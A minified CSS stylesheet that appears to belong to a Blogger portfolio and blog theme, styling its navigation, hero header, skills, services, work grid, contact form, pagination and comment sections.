.pt-40{padding-top:40px}
.pt-60{padding-top:60px}
.pt-80{padding-top:80px}
.pt-100{padding-top:100px}
.ptb-10{padding:10px 0}
.ptb-20{padding:20px 0}
.ptb-30{padding:30px 0}
.ptb-50{padding:50px 0}
.prl-10{padding:0 10px}
.prl-20{padding:0 20px}
.prl-30{padding:0 30px}
.prl-40{padding:0 40px}
.prl-50{padding:0 50px}
.facebook{background-color:#3b5998}
.twitter{background-color:#0084b4}
.youtube{background-color:#b00}
.linkedin{background-color:#007bb6}
.google{background-color:#dd4b39}
.instagram{background-color:#e95950}
.whatsapp{background-color:#4dc247}
.github{background-color:#000}
.loading{position:fixed;top:0;left:0;height:100%;width:100%;background-color:#fff;z-index:999999}
.spinner{margin:50vh auto;width:120px;height:40px;text-align:center;font-size:10px;position:relative}
.spinner>div{background-color:#c49b66;height:100%;width:5px;display:inline-block;-webkit-animation:sk-stretchdelay 1.2s infinite ease-in-out;animation:sk-stretchdelay 1.2s infinite ease-in-out;margin:0;margin-right:2px;padding:20px 0}
.spinner .rect2{-webkit-animation-delay:-1.1s;animation-delay:-1.1s}
.spinner .rect3{-webkit-animation-delay:-1s;animation-delay:-1s}
.spinner .rect4{-webkit-animation-delay:-.9s;animation-delay:-.9s}
.spinner .rect5{-webkit-animation-delay:-.8s;animation-delay:-.8s}
.loading .spinner:Before{content:"Loading";position:absolute;bottom:-25px;text-align:center;left:0;right:0;font-size:13px}
@-webkit-keyframes sk-stretchdelay{0%,100%,40%{-webkit-transform:scaleY(.4)}
20%{-webkit-transform:scaleY(1)}
}@keyframes sk-stretchdelay{0%,100%,40%{transform:scaleY(.4);-webkit-transform:scaleY(.4)}
20%{transform:scaleY(1);-webkit-transform:scaleY(1)}
}body{font-family:'Josefin Sans',sans-serif;overflow-x:hidden!important;position:relative}
.section-padding{padding:80px 0}
.section-heading h4{font-weight:100}
p{color:#aaa}
a,a:focus,a:hover{color:inherit}
.tc-title{position:relative;font-weight:400;margin-bottom:30px;padding-bottom:20px;letter-spacing:2px;display:inline-block;border-bottom:1px solid #ccc;text-transform:uppercase}
.tc-title:after{content:'';width:70px;height:1px;background:#c49b66;position:absolute;bottom:-1px;left:0}
.tc-title-center:after{content:'';width:70px;height:1px;background:#c49b66;position:absolute;bottom:-1px;left:calc(50% - 35px)}
.hero .tc-title{width:100%}
.tc_name_title h4{text-transform:uppercase}
.tc_name_title{padding:0;margin-bottom:15px}
.social-icon span{transition:all .5s}
.social-icon span:hover{background:#c49b66!important;border-color:#c49b66!important;color:#fff!important}
.profile-btns{float:right}
a.about-button{display:inline-block;padding:12px 10px;background:#333;color:#fff;text-transform:uppercase;border-radius:40px;width:140px;text-align:center;font-size:12px;margin-right:10px;-webkit-transition:.4s;font-weight:700;transition:.4s;font-family:Open Sans}
a.about-button:hover{box-shadow:0 5px 11px 0 rgba(0,0,0,0.18),0 4px 15px 0 rgba(0,0,0,0.15);-webkit-transition:.4s;transition:.4s}
.profile-btns a:last-child{background:#c49b66}
.hero .social-icon{float:left}
.ct-wrapper{padding:0 20px;position:relative;max-width:1230px;margin:0 auto}
.sidebar-wrapper{width:310px!important;padding:0;float:right;margin:0 0 40px}
.navbar-default{padding:20px 0 30px;background:0;border:0;border-radius:0;z-index:9;position:absolute;top:0;left:0;width:100%}
.nav-scroll{background:#111;height:80px;line-height:80px;padding:0;position:fixed;top:0;left:0;width:100%;transition:all .5s;z-index:99}
.navbar-default .navbar-brand,.navbar-default .navbar-brand:focus,.navbar-default .navbar-brand:hover{font-weight:600;font-size:60px;color:#c49b66}
.navbar-brand{padding:4px 0;font-size:18px;line-height:20px;display:inline-block;text-transform:lowercase;margin-left:-60px!important}
.nav-scroll .navbar-brand{font-size:50px!Important;padding:5px 0}
h1.navbar-brand{transition:.2s}
.tc_nav{margin-right:-60px}
.navbar-default .navbar-nav>li>a{margin:0!important;color:#fff!important;padding:0!important}
.navbar-default .navbar-nav>li{font-size:16px;margin:30px 20px 0;padding:5 10px;font-weight:400;background:0;cursor:pointer;position:relative}
.navbar-default .navbar-nav>li>a.active{color:#c49b66!important;background:0}
.tona-header{background:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiA6Vrhb-BZgFwc55Nd2ebvhthx1QNYU1U8mVOvQvnJCjKUtdmZ33ng0dLH2POCD5c4J5r-n2uLRm60NetYc1NBVgHzlbZJF_MKOreV8w3cpjbXDPVDqWkSc2Hd4BfGKMxr9K8OmGPAQjg/s1600/background.jpg);background-attachment:fixed;background-size:cover;background-repeat:no-repeat;height:110vh;width:100%;position:relative;clip-path:polygon(0 0,100% 0,100% 90%,0 100%);overflow-x:hidden!important}
.header-overlay{position:absolute;top:0;left:0;height:100%;width:100%;background:rgba(0,0,0,.5)}
.caption{color:#fff;margin-left:10%}
.caption h1{margin-bottom:10px}
.caption .type{position:relative}
.caption h2{display:inline-block;margin:0 0 0 20px;font-weight:600;padding-right:20px}
.caption span{font-weight:100;font-size:50px;color:#c49b66}
.typed-cursor{position:absolute;bottom:7px}
.typed-cursor{opacity:1;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;animation:blink 1s infinite}
@keyframes blink{0%{opacity:1}
50%{opacity:0}
100%{opacity:1}
}@-webkit-keyframes blink{0%{opacity:1}
50%{opacity:0}
100%{opacity:1}
}@-moz-keyframes blink{0%{opacity:1}
50%{opacity:0}
100%{opacity:1}
}.button-scroll{position:absolute;bottom:15vh;left:calc(50% - 13px);width:26px;height:50px;border-radius:15px;border:2px solid #fff;cursor:pointer}
.button-scroll span{height:10px;width:2px;position:absolute;left:calc(50% - 1px);background:#fff;-webkit-animation:scroll 1s infinite;-moz-animation:scroll 1s infinite;animation:scroll 1s infinite}
@keyframes scroll{0%{top:50%}
25%{top:55%}
50%{top:60%}
75%{top:55%}
100%{top:50%}
}@-webkit-keyframes scroll{0%{top:50%}
25%{top:55%}
50%{top:60%}
75%{top:55%}
100%{top:50%}
}@-moz-keyframes scroll{0%{top:50%}
25%{top:55%}
50%{top:60%}
75%{top:55%}
100%{top:50%}
}.hero .social-icon span{width:40px;height:40px;line-height:40px;text-align:center;border:1px solid #eee}
.hero .skills{margin:80px 0;margin-top:-30px;margin-bottom:0}
.hero-img img{border-radius:270px;width:440px;height:440px;object-fit:cover;box-shadow:0 0 0 5px #c49b66;border:5px solid #fff}
.skill-items .skill-title span{font-size:35px;color:#c49b66;margin-bottom:30px}
.skills .skills-progress{width:100%;height:2px;background:#eee;margin:15px 0 0}
.skills-progress span{width:0;height:100%;background:#c49b66;display:block}
.numbers{padding:100px 0;background-color:rgba(0,0,0,.8);background-blend-mode:overlay;background-image:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOHtYmOSQZ0KbA_cyakemRWFLfYAZlIz2xcrcof_omY4rfhfMfZHa-bI2SgGVOqaGaPZba946ntSRBClkrUjDsEGWKnUf1o93ayJfBdR0Sqqi-wUgZSLgVfU1H0NF7ccwQ-JfmxlAPHiA/s1600/parallax2.jpg);background-size:cover;background-attachment:fixed;background-position:center}
.numbers .num-items span{font-size:40px;color:#c49b66}
.numbers .num-items p{font-size:20px;font-weight:700;margin:20px auto}
.numbers .num-items h6{color:#fff}
.services .services-items{overflow:hidden}
.services .services-items:first-child{border-bottom:1px solid #eee}
.services-items .item{padding:40px}
.services-items .bord{border-right:1px solid #eee;border-left:1px solid #eee}
.services-items .item span{font-size:40px;color:#c49b66}
.services-items .item h5{margin:20px 0}
.clients{background-blend-mode:overlay;background:rgba(0,0,0,.8);background-image:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOHtYmOSQZ0KbA_cyakemRWFLfYAZlIz2xcrcof_omY4rfhfMfZHa-bI2SgGVOqaGaPZba946ntSRBClkrUjDsEGWKnUf1o93ayJfBdR0Sqqi-wUgZSLgVfU1H0NF7ccwQ-JfmxlAPHiA/s1600/parallax2.jpg);background-size:cover;background-position:center;background-attachment:fixed}
.clients .client-say{padding:100px}
span.icon-quote:before{content:"\f10e";color:#fff;font-family:FontAwesome;background:#c39a65;border-radius:175px;display:inline-block;font-size:35px;width:62px;line-height:65px;height:60px}
.owl-item{cursor:all-scroll}
.client-say .client-item span{font-size:40px;color:#fff}
.client-say .client-item h5{letter-spacing:2px;color:#fff}
.client-say .client-item p{font-size:20px;color:#ccc}
.client-say .client-item h6{font-size:14px;color:#888;margin-bottom:30px}
.owl-theme .owl-dots .owl-dot span{width:20px;height:4px;border-radius:0}
.owl-theme .owl-dots .owl-dot.active span,.owl-theme .owl-dots .owl-dot:hover span{background:#c49b66}
#work{overflow:hidden}
#work .filtering a{padding:0 25px 0 20px;font-size:16px;position:relative;cursor:pointer translation:.2s}
#work .filtering .active,.filtering a:hover{color:#c49b66}
#work .filtering a:after{content:"-";color:#111;position:absolute;right:0;top:0}
#work .filtering a:last-child:after{content:" "}
.work.section-padding{padding:35px 0}
.hire{background-color:rgba(0,0,0,.8);background-blend-mode:overlay;background-image:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUh1Jxtzrjop4Gg1XAaHV4CnB_INJAY1-uUwBnZ2SZ3iUydCw4WmTc01ZcAcacv0A-2XhfDEfUcYHkVYVQaolx5MumCKCAkLTT4EwXQxZ6ydMqG9YssBzuztozxiXpNiNW7iD30yebuvk/s1600/numbers.jpg);background-size:cover;background-attachment:fixed;background-position:center}
.hire h3{color:#fff;letter-spacing:2px;font-weight:100;margin-bottom:30px}
.hire button{padding:7px 25px;color:#fff;font-size:18px;letter-spacing:1px;background:#c49b66;border:1px solid #c49b66;transition:all .5s}
.hire button:hover{background:0}
.preloader-area{background:#fff;bottom:0;left:0;position:fixed;right:0;top:0;z-index:9999}
.double-bounce1,.double-bounce2{width:100%;height:100%;border-radius:50%;background-color:#000;opacity:.6;position:absolute;top:50%;left:50%;height:60px;width:60px;margin-left:-30px;margin-top:-30px;-webkit-animation:sk-bounce 2s infinite ease-in-out;animation:sk-bounce 2s infinite ease-in-out}
.double-bounce2{-webkit-animation-delay:-1s;animation-delay:-1s}
@-webkit-keyframes sk-bounce{0%,100%{-webkit-transform:scale(0.0)}
50%{-webkit-transform:scale(1.0)}
}@keyframes sk-bounce{0%,100%{transform:scale(0.0);-webkit-transform:scale(0.0)}
50%{transform:scale(1.0);-webkit-transform:scale(1.0)}
}.category-title{margin-bottom:10px!important;text-align:center;padding-top:30px}
.aisa-btn{font-size:14px;color:#c49b66}
.aisa-btn a:nth-child(n+2){display:none!important}
.aisa-publish{padding-bottom:20px;padding-top:5px;text-transform:uppercase;text-align:center}
.aisa-publish ul{margin:0!important}
.aisa-publish li{display:inline-block;font-size:12px;list-style:disc;list-style-position:outside;margin:4.5px 0;color:#555;letter-spacing:.3px;margin-bottom:0!important}
.aisa-publish li a{color:#555}
#post-tags{float:left;margin-top:5px}
#tags-name{display:block;float:left;color:#b8b8b8;margin-right:8px;font-family:'Roboto Condensed',sans-serif;font-size:14px;font-weight:700;line-height:24px;text-transform:uppercase}
#post-tags a{display:block;height:24px;color:#fff;float:left;padding:0 8px;margin-right:3px;border-radius:24px;background-color:#dadada;font-size:11px;font-weight:500;line-height:25px;text-transform:uppercase;transition:background .3s}
#post-tags a:hover{background-color:#e94b4b}
li.meta-post-label a:nth-child(n+2){display:none}
span#post-tags a:nth-child(n+4){display:none}
.post-footer{width:100%;display:inline-block;border-top:1px solid #eee;padding-top:20px;padding-bottom:22px;margin-top:20px}
.status-msg-wrap{text-align:center;padding:17px;color:#6f6b6b;margin-bottom:25px;text-transform:capitalize;border:1px solid #ddd}
.status-msg-border{display:none}
#related-header{margin-bottom:28px;font-size:20px;font-weight:700;text-transform:uppercase}
#related-posts{margin-right:-24px}
.related-post{width:240px;float:left;margin-right:15px;list-style-type:none}
.related-post .post-thumb{width:245px;margin-bottom:10px}
.related-post .cat-ribbon{top:120px}
.related-post .format-icon{left:103px;top:59px}
.related-post .post-title{margin-bottom:10px;letter-spacing:1px;text-align:center;text-transform:uppercase;font-family:Open Sans;font-weight:500}
.related-post .post-divider{margin-top:8px;margin-bottom:0}
.single-share{float:right}
.single-share li{float:left;margin-left:5px;background:#000;width:50px;overflow:hidden;border-radius:34px;height:31px;text-align:center;list-style-type:none;transition:.3s width;line-height:30px}
.single-share li .fa{margin:0 0 10px;transition:.2s;font-weight:100}
.single-share li:hover{width:100px}
.single-share li a{color:#fff}
.single-share li a span{color:#fff;font-weight:500;margin-left:5px;transition:.2s ease-in-out}
.single-share li:nth-child(1){background:#40bff4}
.single-share li:nth-child(2){background:#5c82d0}
.single-share li:nth-child(3){background:#ea5d4b}
.single-share li:nth-child(4){background:#e03037}
.work .item{margin-top:5px;position:relative;height:280px;overflow:hidden;background:#000;cursor:pointer}
.work .item img{width:100%;height:275px;-webkit-transition:all .25s ease-out;transition:all .25s ease-out;object-fit:cover;position:relative;opacity:.8}
.item a.readmore{position:absolute;left:0;right:0;text-align:center;bottom:-30px;font-size:12px;color:#000;font-family:Open Sans;font-weight:bold;transform:scale(0);transition:.2s;z-index:999;display:inline-block}
.item a.readmore:before{content:"";background:#c49b66;width:200px;height:30px;display:block;text-align:center;margin:0 auto;bottom:-28px;position:relative;z-index:-1}
.item:hover a.readmore{bottom:15px;transform:scale(1)}
.item:hover .viframe{opacity:.3!important}
iframe.viframe{opacity:.7;transition:.2s;height:275px;width:100%}
.item a.electo{padding:2em 0;color:#fff;text-transform:uppercase;font-size:1.25em;backface-visibility:hidden;position:absolute;top:0;left:0;width:100%;height:100%;overflow:hidden}
.date-outer .item img{-webkit-transition:opacity .35s,-webkit-transform .35s;transition:opacity .35s,transform .35s;-webkit-transform:scale(1.12);transform:scale(1.12)}
.date-outer .item:hover img{opacity:.4;-webkit-transform:scale(1);transform:scale(1.1)}
.date-outer.col-md-4.col-sm-4{padding:0 5px}
.date-outer .item a.electo::before{position:absolute;top:13px;right:17px;bottom:13px;left:17px;border:1px solid #c49b66;content:''}
.date-outer .item a.electo::before,.date-outer .item h2{opacity:0;-webkit-transition:opacity .35s,-webkit-transform .35s;transition:opacity .35s,transform .35s}
.date-outer .item a.electo h2{padding:18% 0 20px;text-align:center;font-size:12px;margin:0 auto;max-width:205px;-webkit-transform:scale(1.5);transform:scale(1.5);font-family:Josefin Sans}
.date-outer .item:hover a.electo::before,.date-outer .item:hover h2{opacity:1;-webkit-transform:scale(1);transform:scale(1)}
.item .fluid-width-video-wrapper{padding-top:77%!important}
.post{margin:20px 0 0;padding:0 3% 20px}
.post-title.entry-title{margin:0;color:#222;font-size:26px;font-family:"Playfair Display",Arial,sans-serif;font-style:normal;text-align:center;font-weight:400}
.post-title a{text-decoration:none;color:#000}
.post-body{letter-spacing:.4px;font-family:"Open Sans",Arial,sans-serif;font-size:15px;font-style:normal;font-weight:400;line-height:26px;color:#666;word-wrap:break-word;word-break:break-word}
.loader{width:100%;position:relative;z-index:90;text-align:center;display:inline-block;margin:60px 0}
.loadmore a{padding:5px 30px;display:inline-block;border-radius:60px;font-size:13px;color:#333;border:3px solid #333;font-weight:bold;text-transform:uppercase;font-family:Open Sans}
.loadmore a i{margin-right:5px}
.loadmore{text-align:center;margin:20px 0;width:100%;display:inline-block}
.loadmore a:hover{background:#333;color:#fff;box-shadow:0 0 10px rgba(51,51,51,0.67)}
.aisa-author{background:#fff;padding:30px 40px;border-top:30px solid #f7f7f7;border-bottom:30px solid #f7f7f7;margin:0 -30px}
.aisa-author .author-avatar{width:116px;padding:35px 0;float:left}
.aisa-author img{border-radius:50%;width:91px;height:91px}
.aisa-author .author-name,.aisa-author h5{font-size:20px;color:#222;margin-bottom:0;margin-top:-2px;display:inline-block;font-family:Playfair Display}
.aisa-author p{letter-spacing:.5px;padding-bottom:9px}
.aisa-author .social{margin-left:115px}
.aisa-author li{display:inline-block;margin:5px 10px 0 0}
.aisa-author li a{color:#999}
textarea#ContactForm1_contact-form-email-message{height:180px!important}
div#top-comment{display:inline-block;width:100%}
.contact_image{display:inline-block}
.contact-con{padding:40px 0}
.contact_image .overlay .contact_info .item{padding:0;text-align:center}
.contact_image .overlay .contact_info .item:nth-of-type(1),.contact_image .overlay .contact_info .item:nth-of-type(2){margin-bottom:0;padding-bottom:65px}
.contact_image .overlay .contact_info .item i{font-size:28px;margin-bottom:15px;width:80px;height:80px;line-height:80px;border-radius:100%;border:1px solid #c49b66;color:#fff;display:inline-block;background:#c49b66}
.contact_image .overlay .contact_info .item div a{color:#000}
.contact_image .overlay .contact_info .item div{font-size:15px;text-transform:uppercase;letter-spacing:2px}
section#contact{padding-top:50px}
.contact_body .inputfield{width:100%;margin-bottom:20px;border:2px solid #ededed;padding:10px;letter-spacing:1px;-webkit-transition:all 300ms linear;-moz-transition:all 300ms linear;-o-transition:all 300ms linear;transition:all 300ms linear;outline:0}
.contact_body .inputfield:hover,.contact_body .inputfield:focus{border:2px solid #333}
.contact_body textarea{min-height:180px}
.contact_body button{background:transparent;margin-bottom:30px}
.contact_body .messages{border-top:1px solid #ef3f3d;border-bottom:1px solid #ef3f3d;background:#f9f9f9;padding:10px;opacity:0;visibility:hidden;z-index:-1;-webkit-transition:all 300ms linear;-moz-transition:all 300ms linear;-o-transition:all 300ms linear;transition:all 300ms linear}
textarea#ContactForm1_contact-form-email-message{margin-bottom:10px}
.contact_body .messages.visible{opacity:1;visibility:visible;z-index:5}
input#ContactForm1_contact-form-submit{background:#c49b66;padding:15px 40px;color:#fff;outline:0;border:0;border-radius:50px;font-family:Open Sans;font-weight:900;text-transform:uppercase;box-shadow:0;transition:.2s ease-in}
input#ContactForm1_contact-form-submit:hover{background:#222;box-shadow:0 0 25px 2px rgba(0,0,0,0.37)}
textarea#ContactForm1_contact-form-email-message{margin-bottom:10px}
p#ContactForm1_contact-form-error-message{position:absolute;padding:1px 20px;border-radius:4px;left:0;color:#e74c3c;text-transform:uppercase;width:100%}
p#ContactForm1_contact-form-error-message img,p#ContactForm1_contact-form-success-message img{width:12px;margin-top:-3px}
form#contactForm{position:relative}
p#ContactForm1_contact-form-success-message{position:absolute;padding:1px 20px;border-radius:4px;left:0;color:#c49b66;text-transform:uppercase;width:100%}
.contactFooter{background-color:#222;padding:35px 0 30px;color:#fdfdfd}
.footerLeft{font-size:14px;color:#777;font-family:Open Sans;text-transform:capitalize;font-weight:100;text-align:center}
.footerLeft a{color:#fff;font-weight:500;font-family:Open Sans}
.home-link{display:none}
.showpageOf{display:none}
.showpageNum a,.showpage a{margin:0 4px}
.showpagePoint{margin:0 2px 0 0}
#blog-pager{margin:0;width:100%;color:#b9b9b9;margin-bottom:20px;font-size:13px;display:inline-block;font-weight:700;text-transform:uppercase}
#blog-pager-newer-link{display:block;float:right;color:#b9b9b9;margin-right:8px;border:1px solid #eee;background-color:#fff;text-decoration:none;padding:9px 13px;transition:all .3s}
#blog-pager-older-link{display:block;float:left;color:#b9b9b9;margin-right:8px;border:1px solid #eee;background-color:#fff;text-decoration:none;padding:9px 13px;transition:all .3s}
#blog-pager-newer-link a,#blog-pager-older-link a{text-decoration:none;color:#b9b9b9}
#blog-pager-older-link:hover,#blog-pager-newer-link:hover{color:#444;border:1px solid #444;background-color:#fff}
#blog-pager-older-link:hover a,#blog-pager-newer-link:hover a{color:#444}
.widget .widget-item-control a img{width:15px!important;height:15px!important}
.PopularPosts h2{padding-right:.4em;padding-left:0}
.popular-posts ul{padding:10px 0 0;margin:0}
.popular-posts ul li{list-style:none outside none!important;margin:0;padding-bottom:5px!important;margin-bottom:10px;padding-top:0!important}
.PopularPosts .item-title a{margin-top:-4px;color:inherit;font-size:14px;font-weight:400;line-height:1.77;display:block;letter-spacing:normal;margin-bottom:10px;font-family:Open Sans;text-transform:uppercase}
.PopularPosts a{color:#666;font-size:.9rem;line-height:normal;text-decoration:none}
.PopularPosts a:hover{color:#222}
.PopularPosts img{padding-right:0;height:80px;object-fit:cover;width:100%;border-radius:4px}
.PopularPosts .item-thumbnail{width:95px;margin:0 10px 0 0;float:left}
.popular-posts ul li:last-child{border:0;padding:0!important;margin:0}
.cloud-label-widget-content .label-size{background-color:#efefef;color:#a7a7a7!important;margin:0 7px 7px 0;display:block;float:left;padding:2px 11px;font-size:12px!important;-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;line-height:25px;text-transform:lowercase}
.cloud-label-widget-content{text-align:initial}
.cloud-label-widget-content .label-size a{color:#a7a7a7!important}
.cloud-label-widget-content .label-size:hover{background-color:#222;color:#fff!important}
.label-size:hover.label-size a{color:#fff!important}
.Profile img{border:1px solid #cecece;background:#fff;float:left;margin:5px 10px 5px 0;padding:5px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}
.profile-data{color:#999;font:bold 20px/1.6em Arial,Helvetica,Tahoma,sans-serif;font-variant:small-caps;margin:0;text-transform:capitalize}
.profile-datablock{margin:.5em 0}
.profile-textblock{line-height:1.6em;margin:.5em 0}
a.profile-link{clear:both;display:block;font:80% monospace;padding:10px 0;text-align:center;text-transform:capitalize}
.showpageArea a{text-decoration:underline}
.showpageNum a{text-decoration:none;padding:7px;padding-left:10px;padding-right:10px;font-size:15px;color:#fff}
.showpagePoint{color:#fff;text-decoration:none;background:#000;margin:0 3px;padding:7px;padding-left:10px;padding-right:11px;font-size:15px}
.showpageOf{text-decoration:none;padding:3px;margin:0 3px 0 0;font-size:15px margin:0 3px}
.showpage a{text-decoration:none;padding:7px;padding-left:10px;padding-right:10px;color:#fff;font-size:15px}
.showpage a:hover{text-decoration:none}
.showpageNum a:link,.showpage a:link{text-decoration:none;background-color:#000}
.showpageOf{display:none}
.showpageNum{margin:0 3px}
.showpageArea{padding-bottom:20px}
.sidebar{margin:0;padding:0;display:block}
.sidebar h2{font-size:25px;margin-top:0;padding-bottom:10px;padding-bottom:10px;position:relative;font-weight:400;letter-spacing:2px;display:inline-block;border-bottom:1px solid #ccc;text-transform:capitalize}
.sidebar h2:after{content:'';width:70px;height:1px;background:#c49b66;position:absolute;bottom:-1px;left:0}
.sidebar .widget{clear:both;width:100%;font-size:16px;line-height:26px;margin-bottom:20px;display:inline-block;background:#fff;padding:20px}
.sidebar ul{margin:0;padding:0;list-style:none}
.sidebar li{margin:0 0 0 15px;padding:0 0 5px;text-transform:capitalize}
#footer{display:inline-block}
.footer{float:left;width:32%}
.footer h2{font-size:18px;letter-spacing:1px;color:#FFF;margin-bottom:19px;padding:6px;border-bottom:1px solid rgba(255,255,255,1);font-family:sans-serif;text-align:center}
.footer .widget{clear:both;font-size:16px;line-height:26px;margin:15px 25px 25px}
.footer ul{margin:0;padding:0;list-style:none}
.footer li{margin:0 0 0 15px;padding:0 0 5px;text-transform:capitalize}
.footer-credits{border-top:1px solid #555;padding:15px;background:#111;text-shadow:1px 1px #000;color:#999;font-size:80%}
.footer-credits .attribution{float:right}
.footer-credits .attribution a{font-style:italic}
#footer a,.footer-credits a{text-decoration:none;color:#fff}
#footer a:hover,.footer-credits a:hover{text-decoration:underline;color:#d4d4d4}
#comments{background:#FFF;margin-top:20px}
.komhead h4{position:relative;z-index:2;height:38px;color:#fff;padding:0 12px;background-color:#444;font-family:'Roboto',sans-serif;font-size:15px;font-weight:700;text-transform:uppercase;line-height:38px;margin-bottom:30px;box-shadow:6px 6px 0 #e9e9e9}
.komhead h4:before{content:"";border-top:12px solid #e9e9e9;border-left:12px solid transparent;border-right:12px solid transparent;position:absolute;bottom:-16px;left:30px}
.komhead h4:after{content:"";border-top:12px solid #444;border-left:12px solid transparent;border-right:12px solid transparent;position:absolute;bottom:-12px;left:20px}
#comments #comment-post-message{color:#FFF;background:#504f4c;margin:0;padding:10px;line-height:normal;border-radius:2px;font-size:15px}
#comments .user a{color:#555;font-style:normal;font-size:16px;line-height:26px;font-weight:400;letter-spacing:1px}
#comments .datetime,#comments .datetime a{color:#999;text-decoration:none;margin:0;font-size:14px;display:inline-block;float:right}
.comments .comments-content .comment-content{margin:0 0 20px;color:#7b7b7b}
#comments .datetime a{margin:auto}
#comments .comment-actions a{background-color:#504f4c;border:1px solid #504f4c;border-radius:2px;color:#FFF;font-size:11px;padding:5px 15px;text-transform:uppercase;text-decoration:none;margin-right:10px}
#comments .comment-actions a:hover{color:#fff;background-color:#555;border:1px solid #555}
#comments .comment{border-bottom:1px solid #eee;padding:0 0 5px}
#comments .loadmore{margin-top:0}
#comment-editor{height:235px}
.comments .comments-content .avatar-image-container{max-height:76px;width:76px;margin-top:6px}
#comments .comments-content .avatar-image-container img{max-width:75px;border-radius:4px;width:100%}
.comments .comment-block{margin-left:90px!important}
span.icon.user.blog-author:after{background-color:#e74c3c;color:#FFF;padding:5px 15px;font-weight:400;line-height:1;border-radius:20px;font-size:13px;content:"Admin";box-shadow:2px 2px 0 #a0382e;display:inline-block}
.comments .comments-content a{color:#000}
.thread-toggle.thread-expanded{border-bottom:1px solid #ddd;width:100%;padding:0 0 10px;margin-bottom:10px}
#comments .thread-chrome .comment{border-bottom-color:#ddd!important}
#comments .comment-author{padding-left:25px}
.comment-body{margin:.5em 25px}
.comment-footer{margin:.5em 25px 1.5em}
.comment-body p{margin:0}
#comments .avatar-comment-indent .comment-author{margin-left:-45px;padding-left:45px}
.deleted-comment{font-style:italic;opacity:.5}
#comment-actions{background:transparent;border:0;padding:0;position:absolute;height:25px}
#comments .blogger-comment-icon,.blogger-comment-icon{line-height:16px;background:url(/img/b16-rounded.gif) left no-repeat;padding-left:20px}
#comments .openid-comment-icon,.openid-comment-icon{line-height:16px;background:url(/img/openid16-rounded.gif) left no-repeat;padding-left:20px}
#comments .anon-comment-icon,.anon-comment-icon{line-height:16px;background:url(/img/anon16-rounded.gif) left no-repeat;padding-left:20px}
.comment-form{clear:both;_width:410px}
.comment-link{white-space:nowrap}
.paging-control-container{float:right;margin:0 6px 0 0;font-size:80%}
.unneeded-paging-control{visibility:hidden}
#comments-block .avatar-image-container img{-ms-interpolation-mode:bicubic;border:1px solid #ccc;float:right}
#comments-block .avatar-image-container.avatar-stock img{border-width:0;padding:1px}
#comments-block .avatar-image-container{height:37px;left:-45px;position:absolute;width:37px}
#comments-block.avatar-comment-indent{margin-left:45px;position:relative}
#comments-block.avatar-comment-indent dd{margin-left:0}
iframe.avatar-hovercard-iframe{border:0 none;padding:0;width:25em;height:9.4em;margin:.5em}
.comments{clear:both;margin-top:10px;margin-bottom:0}
.comments .comments-content{margin-bottom:16px}
.comments .comment .comment-actions a{padding-right:5px;padding-top:5px}
.comments .comment .comment-actions a:hover{text-decoration:underline}
.comments .comments-content .comment-thread ol{list-style-type:none;padding:0;text-align:left}
.comments .comments-content .inline-thread{padding:.5em 1em}
.comments .comments-content .comment-thread{margin:8px 0}
.comments .comments-content .comment-thread:empty{display:none}
.comments .comments-content .comment-replies{margin-left:36px;margin-top:1em}
.comments .comments-content .comment{margin-bottom:16px;padding-bottom:8px}
.comments .comments-content .comment:first-child{padding-top:16px}
.comments .comments-content .comment:last-child{border-bottom:0;padding-bottom:0}
.comments .comments-content .comment-body{position:relative}
.comments .comments-content .user{font-style:normal;font-weight:700}
.comments .comments-content .icon.blog-author{display:inline-block;height:18px;margin:0 0 -4px 6px;width:18px}
.comments .comments-content .datetime{margin-left:6px}
.comments .comments-content .comment-header,.comments .comments-content .comment-content{margin:0 0 8px}
.comments .comments-content .comment-content{text-align:justify}
.comments .comments-content .owner-actions{position:absolute;right:0;top:0}
.comments .comments-replybox{border:0;height:250px;width:100%}
.comments .comment-replybox-single{margin-left:48px;margin-top:5px}
.comments .comment-replybox-thread{margin-top:5px}
.comments .comments-content .loadmore a{display:block;padding:10px 16px;text-align:center}
.comments .thread-toggle{cursor:pointer;display:inline-block;border:1px solid #ddd;width:100%;padding:10px;margin-bottom:10px}
.comments .continue{cursor:pointer}
.comments .continue a{background-color:#e74c3c;border:1px solid #e74c3c;border-radius:2px;color:#FFF!important;font-size:11px;display:inline-block;padding:0 20px;text-transform:uppercase;text-decoration:none;margin-right:10px}
.comments .comments-content .loadmore{cursor:pointer;margin-top:3em;max-height:3em}
.comments .comments-content .loadmore.loaded{max-height:0;opacity:0;overflow:hidden}
.comments .thread-chrome.thread-collapsed{display:none}
.comments .thread-toggle{display:inline-block}
.comments .thread-toggle .thread-arrow{display:inline-block;height:8px;margin:.3em;overflow:visible;padding-right:4px;width:10px;top:3px;position:relative}
.comments .thread-expanded .thread-arrow{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAYAAADEUlfTAAAAG0lEQVR42mNgwAfKy8v/48I4FeA0AacVDFQBAP9wJkE/KhUMAAAAAElFTkSuQmCC) no-repeat scroll 0 0 transparent}
.comments .thread-collapsed .thread-arrow{background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAcAAAAHCAYAAADEUlfTAAAAJUlEQVR42mNgAILy8vL/DLgASBKnApgkVgXIkhgKiNKJ005s4gDLbCZBiSxfygAAAABJRU5ErkJggg==) no-repeat scroll 0 0 transparent}
.comments .avatar-image-container{float:left;max-height:36px;overflow:hidden;width:36px}
.comments .avatar-image-container img{max-width:36px}
.comments .comment-block{margin-left:48px;position:relative}
@media screen and (max-device-width:480px){.comments .comments-content .comment-replies{margin-left:0}
}div#bc_0_1BR span:first-child{width:100%}
span#bc_0_0TT{display:none}
.widget-item-control{display:none}
h2.date-header{display:none}
.first_post_img{width:100%}
.big_post_image{margin:0 -15px}
@media only screen and (max-width:550px){.hero-img{width:100%!Important}
h1.navbar-brand{font-size:45px!important}
.nav-scroll .navbar-brand{font-size:35px!Important;line-height:25px!Important}
}@media only screen and (max-width:1350px){.navbar-brand{margin-left:25px!important}
.hero-img img{width:100%!important;height:inherit!important}
}@media only screen and (max-width:1200px){.menu-area .container{width:100%}
.nav>li{padding:0}
.navbar-nav li a{padding:15px 6px}
